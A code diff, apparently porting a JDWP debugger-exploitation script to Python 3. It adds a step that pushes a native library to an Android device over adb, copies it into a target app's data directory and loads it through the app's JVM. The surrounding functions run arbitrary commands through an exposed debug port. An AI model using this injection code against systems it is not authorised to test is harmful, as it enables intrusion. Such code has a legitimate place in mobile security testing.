@@ -10,6 +10,8 @@
 # loadlib option by @ikoz
 #
 
+from pathlib import Path
+from subprocess import run
 import socket
 import time
 import sys
@@ -236,6 +238,9 @@ class JDWPClient:
             return self.threads
 
     def get_thread_by_name(self, name):
+        if isinstance(name, str):
+            name = name.encode("utf8")
+
         self.allthreads()
         for t in self.threads:
             threadId = self.format(self.objectIDSize, t["threadId"])
@@ -260,6 +265,9 @@ class JDWPClient:
         return self.classes
 
     def get_class_by_name(self, name):
+        if isinstance(name, str):
+            name = name.encode("utf8")
+
         for entry in self.classes:
             if entry["signature"].lower() == name.lower() :
                 return entry
@@ -278,6 +286,9 @@ class JDWPClient:
         return self.methods[refTypeId]
 
     def get_method_by_name(self, name):
+        if isinstance(name, str):
+            name = name.encode("utf8")
+
         for refId in list(self.methods.keys()):
             for entry in self.methods[refId]:
                 if entry["name"].lower() == name.lower() :
@@ -307,6 +318,9 @@ class JDWPClient:
         return field
 
     def createstring(self, data: bytes):
+        if isinstance(data, str):
+            data = data.encode("utf8")
+
         buf = self.buildstring(data)
         self.socket.sendall( self.create_packet(CREATESTRING_SIG, data=buf) )
         buf = self.read_reply()
@@ -497,8 +511,13 @@ def runtime_exec(jdwp, args):
         runtime_exec_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], args.cmd)
     elif args.loadlib:
         packagename = getPackageName(jdwp, tId)
-        tmpLocation = "/data/local/tmp/" + args.loadlib
-        dstLocation = "/data/data/" + packagename + "/" + args.loadlib
+        print(f"{packagename = }")
+
+        tmpLocation = "/data/local/tmp/" + Path(args.loadlib).name
+        print("Pushing to device")
+        run(["adb", "push", args.loadlib, tmpLocation], check=True)
+
+        dstLocation = "/data/data/" + packagename + "/" + Path(args.loadlib).name
         command = "cp " + tmpLocation + " " + dstLocation
         print("[*] Copying library from " + tmpLocation + " to " + dstLocation)
         runtime_exec_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], command)
@@ -590,9 +609,6 @@ def runtime_exec_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, comma
     # This function will invoke command as a payload, which will be running
     # with JVM privilege on host (intrusive).
     #
-    if isinstance(command, str):
-        command = command.encode("utf8", "ignore")
-
     print(("[+] Selected payload '%s'" % command))
 
     # 1. allocating string containing our command to exec()
@@ -641,12 +657,12 @@ def getPackageName(jdwp, threadId):
     activityThreadClass = jdwp.get_class_by_name("Landroid/app/ActivityThread;")
     if activityThreadClass is None:
         print("[-] Cannot find class android.app.ActivityThread")
-        return False
+        return None
 
     contextWrapperClass = jdwp.get_class_by_name("Landroid/content/ContextWrapper;")
     if contextWrapperClass is None:
         print("[-] Cannot find class android.content.ContextWrapper")
-        return False
+        return None
 
     jdwp.get_methods(activityThreadClass["refTypeId"])
     jdwp.get_methods(contextWrapperClass["refTypeId"])
@@ -654,34 +670,34 @@ def getPackageName(jdwp, threadId):
     getContextMeth = jdwp.get_method_by_name("currentApplication")
     if getContextMeth is None:
         print("[-] Cannot find method ActivityThread.currentApplication()")
-        return False
+        return None
 
     buf = jdwp.invokestatic(
         activityThreadClass["refTypeId"], threadId, getContextMeth["methodId"])
-    if buf[0] != chr(TAG_OBJECT):
+    if buf[0] != TAG_OBJECT:
         print("[-] Unexpected returned type: expecting Object")
-        return False
+        return None
     rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])
     if rt is None:
-        print "[-] Failed to invoke ActivityThread.currentApplication()"
-        return False
+        print("[-] Failed to invoke ActivityThread.currentApplication()")
+        return None
 
     # 3. find getPackageName() method
     getPackageNameMeth = jdwp.get_method_by_name("getPackageName")
     if getPackageNameMeth is None:
         print("[-] Cannot find method ActivityThread.currentApplication().getPackageName()")
-        return False
+        return None
 
     # 4. call getPackageNameMeth()
     buf = jdwp.invoke(rt, threadId, contextWrapperClass["refTypeId"], getPackageNameMeth["methodId"])
-    if buf[0] != chr(TAG_STRING):
+    if buf[0] != TAG_STRING:
         print("[-] %s: Unexpected returned type: expecting String" % propStr)
     else:
         retId = jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])
         res = cli.solve_string(jdwp.format(jdwp.objectIDSize, retId))
         print("[+] getPackageMethod(): '%s'" % (res))
 
-    return "%s" % res
+    return res.decode("utf8")
 
 
 def runtime_load_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, library):
@@ -701,13 +717,13 @@ def runtime_load_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, libra
 
     # 2. use context to get Runtime object
     buf = jdwp.invokestatic(runtimeClassId, threadId, getRuntimeMethId)
-    if buf[0] != chr(TAG_OBJECT):
+    if buf[0] != TAG_OBJECT:
         print("[-] Unexpected returned type: expecting Object")
         return False
     rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])
 
     if rt is None:
-        print "[-] Failed to invoke Runtime.getRuntime()"
+        print("[-] Failed to invoke Runtime.getRuntime()")
         return False
     # print("[+] Runtime.getRuntime() returned context id:%#x" % rt)
 
@@ -719,7 +735,7 @@ def runtime_load_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, libra
     # print("[+] found Runtime.load(): id=%x" % loadMeth["methodId"])
 
     # 4. call exec() in this context with the alloc-ed string
-    data = [chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, cmdObjId)]
+    data = [bytes([TAG_OBJECT]) + jdwp.format(jdwp.objectIDSize, cmdObjId)]
     jdwp.invokeVoid(rt, threadId, runtimeClassId, loadMeth["methodId"], *data)
 
     print("[+] Runtime.load(%s) probably successful" % library)
